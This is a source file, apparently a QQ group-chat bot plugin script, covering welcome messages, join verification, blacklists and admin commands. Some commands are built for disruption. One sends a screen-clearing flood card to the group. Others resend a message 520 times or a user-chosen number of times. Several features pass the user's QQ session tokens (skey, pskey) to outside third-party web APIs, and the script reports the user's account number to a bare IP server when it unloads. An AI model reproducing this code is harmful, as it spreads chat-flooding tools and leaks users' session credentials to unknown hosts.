\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");}}
    	if(t.equals("CEChat")){sendCard(msg.GroupUin,"","<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><msg serviceID=\"109\" templateID=\"1\" action=\"\" brief=\"你已被移除群聊\" sourceMsgId=\"0\" url=\"\" flag=\"3\" adverSign=\"0\" multiMsgFlag=\"0\"><item layout=\"2\" mode=\"1\" bg=\"-18751\" advertiser_id=\"0\" aid=\"0\"><picture cover=\"mqqapi://card/show_pslcard?src_type=internal&amp;source=sharecard&amp;version=1&amp;uin=2016568075\" w=\"0\" h=\"0\" /><title>警告⚠开始清屏，非专业人士请撤离！</title></item><item layout=\"6\" advertiser_id=\"0\" aid=\"0\"><summary size=\"100000\" color=\"#000000\">清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n清屏\n</summary><hr hidden=\"false\" style=\"0\" /></item><source name=\"\" icon=\"\" action=\"\" appid=\"-1\" /></msg>");}
    	//if(t.equals("［看戏］")){hide.set(new String[]{msg.GroupUin},"beHide","true");发送(msg.GroupUin,"","已经入看戏模式，没人能看到你的消息！");}
    	if(t.equals("检查更新")){
    	    try{
        	    JSONObject v = new JSONObject(new httpRequests("http://8.134.160.205/qt","").get(""));
        	    发送(msg.GroupUin,"","检查完毕:\n当前版本："+sv+"\n最新版本："+v.getString("v")+"\n链接："+v.getString("u"));
    	    }catch(Exception e){
    	    	发送(msg.GroupUin,"","暂时无法检查更新");
    	    }
    	}if(t.startsWith("@")&&t.indexOf(".头衔=")!=-1){
    		String[] title = t.substring(t.indexOf(".头衔=")+4).split(",");
    		int n = 0;
    		for (String i:msg.AtList){
    			if(n>=title.length){
    				n = title.length-1;
    			}
    			setTitle(msg.GroupUin,i,title[n]);
    			n++;
    		}
    	}if(t.startsWith("上管@")){
    		for (String i:msg.AtList){
    			String skey = (issq?getSkey():"");		
           		String pskey = (issq?getPskey("qun.qq.com"):"");
    	  		发送(msg.GroupUin,"",new httpRequests("http://api.caonmtx.cn/api/qq_guanli.php?uin="+MyUin+"&skey="+skey+"&pskey="+pskey+"&qh="+msg.GroupUin+"&qq="+i+"&msg=上管理","").get("utf-8"));
    		}
    	}if(t.startsWith("卸任@")||(t.startsWith("@")&&t.indexOf("退下吧")!=-1)){
    		for (String i:msg.AtList){
    			String skey = (issq?getSkey():"");		
           		String pskey = (issq?getPskey("qun.qq.com"):"");
    	  		String url = "http://api.caonmtx.cn/api/qq_guanli.php?skey="+skey+"&pskey="+pskey+"&uin="+MyUin+"&qh="+msg.GroupUin+"&qq="+i+"&msg=下管理";
    			httpRequests htt = new httpRequests(url,"");
    			发送(msg.GroupUin,"",htt.get("UTF-8"));
    		}
    	}if(t.startsWith("在此吾凝结毕生之力，开辟一片新天地，唤做")&&t.indexOf("，并授其称号：")!=-1){
    		String name = t.substring(20,t.indexOf("，并授其称号："));
    		String tag = t.substring(t.indexOf("，并授其称号：")+7);
    		JSONObject js = new JSONObject(new httpRequests("http://xiaobai.klizi.cn/API/qqgn/qun_create.php?uin="+MyUin+"&skey="+(issq?getSkey():"")+"&pskey="+(issq?getPskey("qun.qq.com"):"")+"&msg="+name+"&txt="+tag,"").get("UTF-8"));
    		Toast(js.toString());
    		发送(msg.GroupUin,"","[AtQQ="+MyUin+"]，感受到你的呼唤，新天地已被打通，坐标："+js.getString("gc"));
    	}/*if(t.equals("以吾示大")){
    		new httpRequests("http://xiaobai.klizi.cn/API/qqgn/qun_head.php?uin="+MyUin+"&skey="+(issq?getSkey():"")+"&pskey="+(issq?getPskey("qun.qq.com"):"")+"&group="+msg.GroupUin+("&img=http://q1.qlogo.cn/g?b=qq&nk=QQ&s=100&t=1547904810".replace("QQ",MyUin))).get("UTF-8");
    		发送(msg.GroupUin,"","此群现乃我天下！");
    	}*/if(t.startsWith("召唤")&&t.indexOf("个文案")!=-1){
    		long num = Long.parseLong(t.substring(2,t.indexOf("个文案")));
    		for(long i = 0;i < num;i++){
    			发送(msg.GroupUin,"",文案());
    		}
    	}/*if(t.equals("本群已发消息数")){
    		发送(msg.GroupUin,"","此群已发"+(msg.msg.shmsgseq+1)+"条消息");
    	}*/
    	if(t.equals("杀！")){
    		for(int i = 0;i < 520;i++){
    			发送1(msg.GroupUin,"","土包子永远滴神！");
    		}
    	}if(t.equals("开启消息存储")){
    	    opens.set(new String[]{msg.GroupUin},"消息存储","1");
    	    发送(msg.GroupUin,"","消息存储已开启，接下来你发的每条消息都会被存储起来，发送“发送”一起发送");
    	}if(t.equals("留个留言")){
    	    加载活动();
    	    活动.runOnUiThread(new Runnable(){
    	        public void run(){
        	        TextView t=new TextView(活动);
        	        t.setText(Html.fromHtml("<font color=\"#0000FF\">书写你的留言吧：</font>"));
        	        EditText 留言=new EditText(活动);
        	        留言.setWidth(400);
        	        LinearLayout layout = new LinearLayout(活动);
        	        layout.addView(t);
        	        layout.addView(留言);
        	        new AlertDialog.Builder(活动,AlertDialog.THEME_DEVICE_DEFAULT_LIGHT).setTitle("留言").setView(layout).setPositiveButton("确定", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialogInterface, int i) {
                            new Thread(new Runnable(){
                                public void run(){
                                    new httpRequests("http://8.134.160.205/addLiuYan","").post("qq="+MyUin+"&text="+留言.getText());
                                }
                            }).start();
                        }
                    }).setNegativeButton("取消", null).show();
                }
    	    });
    	}
	}
}public void onUnload(){
	Toast("感谢您的使用，欢迎下次再见！");
	new Thread(new Runnable(){
	    	public void run(){
	    		try{new httpRequests("http://8.134.160.205/qtdown","").post("u="+MyUin);}catch(Exception e){}
	    	}
	    }
	).start();
}public String getMsg(String 文本,号,int 人或群){
	/*
	keyValueSys kv = new keyValueSys(RootPath+"故念目录");
	if(文本.startsWith("设置")&&文本.indexOf("->")!=-1){
		String[] set = 文本.substring(2).split("->",2);
		kv.set(new String[]{"dataBase",号,"替换"},set[0],set[1]);
		文本 = "";
	}if(文本.startsWith("删除")){
		String set = 文本.substring(2);
		kv.del(new String[]{"dataBase",号,"替换"},set);
		文本 = "";
	}if(kv.get(new String[]{"dataBase",号,"替换"},文本)){//替换
		
	}*/
	/*if(文本.startsWith("语音：")&&文本.lastIndexOf("(")!=-1){
		String text = 文本.split("：",2)[1];
		text = text.substring(0,text.lastIndexOf("("));
		String[] datas = 文本.substring(文本.lastIndexOf("(")+1).replace(")","").split(",");
		JSONObject js = new JSONObject(new httpRequests("http://xiaobai.klizi.cn/API/other/baidu.php?per="+datas[0]+"&pit="+datas[1]+"&spd="+datas[2]+"&msg="+text,"").get("UTF-8"));
		//Toast(js.getString("url"));
		new fileSystem(RootPath+"故念目录/临时语音.mp3").writeBytes(new httpRequests(js.getString("url"),"").getBytes());
		sendVoice(人或群==1?号:"",人或群==2?号:"",RootPath+"故念目录/临时语音.mp3");
		文本="";
	}*/
	if(a())b();
	//if(文本.equals("冒泡")){hide.set(new String[]{号},"beHide","false");}
	if(hide.get(new String[]{号},"beHide").equals("true")){文本+=" జ్ఞ ా رً ॣ";}
	if(文本.equals("关闭消息存储")){
	    opens.set(new String[]{号},"消息存储","0");
	    发送(号,"","已关闭");
	}if(opens.get(new String[]{号},"消息存储").equals("1")){
    	if(文本.equals("发送")){
    	    JSONArray saves = new JSONArray(msgSave.get(new String[]{号},"存").isEmpty()?"[]":msgSave.get(new String[]{号},"存"));
    	    for(int i = 0;i < saves.length();i++){
    	        sendMsg(号,"",saves.getString(i));
    	    }saves=new JSONArray("[]");
    	    msgSave.set(new String[]{号},"存",saves.toString());
    	    文本="";
    	}else if(文本.equals("清空")){
    	    JSONArray saves = new JSONArray("[]");
    	    msgSave.set(new String[]{号},"存",saves.toString());
    	    Toast("已清空");
    	    文本="";
    	}else if(文本.equals("查看")){
    	    JSONArray saves = new JSONArray(msgSave.get(new String[]{号},"存").isEmpty()?"[]":msgSave.get(new String[]{号},"存"));
    	    String te = "你存了以下消息：\n";
    	    for(int i = 0;i < saves.length();i++){
    	        te+="·"+saves.getString(i)+"\n";
    	    }Toast(te);
    	    文本="";
    	}else{
    	    JSONArray saves = new JSONArray(msgSave.get(new String[]{号},"存").isEmpty()?"[]":msgSave.get(new String[]{号},"存"));
    	    saves.put(文本);
    		msgSave.set(new String[]{号},"存",saves.toString());
    		文本="";
    	}
	}
	if(文本.startsWith("悄悄话：")){
		文本 = 文本.split("：",2)[1];
		文本 += "\nజ్ఞ ా رً ॣ";
	}if(Pattern.matches("[\\s\\S]*\\([^\\)]*\\)##[\\d]+[\\s\\S]*",文本)){
		try{
		    Pattern p = Pattern.compile("\\([^\\)]*\\)##[\\d]+");
			while(Pattern.matches("[\\s\\S]*\\([^\\)]*\\)##[\\d]+[\\s\\S]*",文本)){
			    try{
			    	Matcher r =	p.matcher(文本);
			    	if(!r.find())break;
    			    String This = r.group(0);
    				文本=文本.replaceFirst("\\([^\\)]*\\)##[\\d]+",ns(This.substring(1,This.lastIndexOf(")")),Integer.parseInt(This.substring(This.lastIndexOf("##")+2))));
				}catch(Exception e){}
			}
		}catch (Exception e){
			Toast(""+e);
		}
	}if(Pattern.matches("刷[\\d]+：[\\s\\S]*",文本)){
	    for(int i = 0;i < Integer.parseInt(匹配("[\\d]+",文本));i++){
	    	sendMsg(人或群==1?号:"",人或群==2?号:"",文本.split("：",2)[1].replace("@全体成员","[AtQQ=0]"));
	    }文本="";
	}if(文本.startsWith("分字：")){
		char[] zf = 文本.substring(3).substring(0,文本.lastIndexOf("#")-3).toCharArray();
		long jg = Long.parseLong(文本.substring(文本.lastIndexOf("#")+1));
		new Thread(new Runnable(){
			public void run(){
				for (char i:zf){
					发送1(人或群==1 ? 号:"",人或群==2 ? 号:"",""+i);
					Thread.sleep(((long)(Math.random()*(jg-1))+1)*1000L);
				}
			}
		}).start();
		文本 = "";
	}
	/*if(文本.startsWith("语音：")){
		String[] dat = 文本.substring(文本.lastIndexOf("(")+1,文本.lastIndexOf(")")).split(",");
		String txt = 文本.split("：")[1].substring(0,文本.lastIndexOf("("));
		sendVoice(人或群==1 ? 号:"",人或群==2 ? 号:"",new JSONObject(new httpRequests("http://xiaobai.klizi.cn/API/other/baidu.php?per="+dat[0]+"&pit="+dat[1]+"&spd="+dat[2]+"&msg="+txt).get("UTF-8")).getString("url"));
		return "";
	}*/
	if(文本.indexOf("@全体成员")!=-1){
		sendMsg(人或群==1 ? 号:"",人或群==2 ? 号:"",文本.replace("@全体成员","[AtQQ=0]"));
		return "";
	}if(文本.indexOf("|")!=-1){
		文本=z(文本.replace("\\|","\u202c").split("|",2)[0].replace("\u202c","|"),文本.replace("\\|","\u202c").split("|",2)[1].replace("\u202c","|"));
	}
	return 文本;
}public void OnTroopEvent(String 群,人,int 事){
    if(a())b();
	String 时 = new SimpleDateFormat("yyyy年MM月dd日 HH:mm:ss").format(new Date());
	JSONObject js = new JSONObject(new httpRequests("https://www.dreamling.xyz/API/QQ/get_qq_picture_name/api.php?qq="+人,"").get(""));
	if(事==1){
	    if(opens.get(new String[]{群},"送别").equals("1")){发送1(群,"",globals.get(new String[]{"格式"},"退群").replace("[那人]","[AtQQ="+人+"]").replace("[时间]",时).replace("[群]",群).replace("[人]",人).replace("[头像]","[PicUrl="+js.getString("640img")+"]").replace("[昵称]",js.getString("name")));}
	    if(opens.get(new String[]{群},"进群验证").equals("1")){
            if(yz.get(群).has(人)){
                JSONObject j1 = yz.get(群);
        	    JSONObject j2 = j1.get(人);
        	    j2.put("out",true);
        	    j1.put(人,j2);
        	    yz.put(群,j1);
            }
        }
	}else if(事==2){
	    if(getBlack(群,人)!=0){
	        Kick(群,人,false);
	        发送(群,"","发现"+(getBlack(群,人)==1?"本群":"全局")+"黑名单成员："+人+"，已踢出");
	    }if(opens.get(new String[]{群},"欢迎").equals("1")){发送1(群,"",globals.get(new String[]{"格式"},"进群").replace("[那人]","[AtQQ="+人+"]").replace("[时间]",时).replace("[群]",群).replace("[人]",人).replace("[头像]","[PicUrl="+js.getString("640img")+"]").replace("[昵称]",js.getString("name")));}
        if(opens.get(new String[]{群},"进群验证").equals("1")){
            long need = rand(0,99999);
            发送(群,"","[AtQQ="+人+"]注意：本群已开启进群验证，请在3分钟内发送"+need+"，否则将踢出群聊");
            JSONObject j1 = (yz.has(群)?yz.get(群):new JSONObject("{}"));
            j1.put(人,new JSONObject("{\"bool\":false,\"need\":\""+need+"\",\"out\":false}"));
            yz.put(群,j1);
            new Thread(new Runnable(){
                public void run(){
                    int ms=0;
                    while(opens.get(new String[]{群},"进群验证").equals("1")){
                        if(yz.get(群).get(人).get("bool")){
                            发送(群,"","[AtQQ="+人+"]验证完毕，欢迎入群！");
                            JSONObject j1 = yz.get(群);
                            j1.remove(人);
                            yz.put(群,j1);
                            break;
                        }if(yz.get(群).get(人).get("out")){
                            发送(群,"",人+"已退出群聊，结束验证");
                            JSONObject j1 = yz.get(群);
                            j1.remove(人);
                            yz.put(群,j1);
                            break;
                        }if(ms>=3*60000){
                            发送(群,"",人+"认证失败，已请出群聊");
                            Kick(群,人,false);
                            JSONObject j1 = yz.get(群);
                            j1.remove(人);
                            yz.put(群,j1);
                            break;
                        }Thread.sleep(250);
                        ms+=250;
                    }
                }
            }).start();
        }
	}
    
}//AddItem("刷新token(有些功能无法使用的时候试试)","getToken",PluginID);
AddItem("检测此群黑名单","checkO",PluginID);
AddItem("检测所有群黑名单","check",PluginID);
Toast(MyUin+tu(new int[][]{{695,611},{391,75},{1055,1007},{480,386},{347,21},{390,220},{374,204},{39,35},{98,96},{61,57},{98,96}})+sv);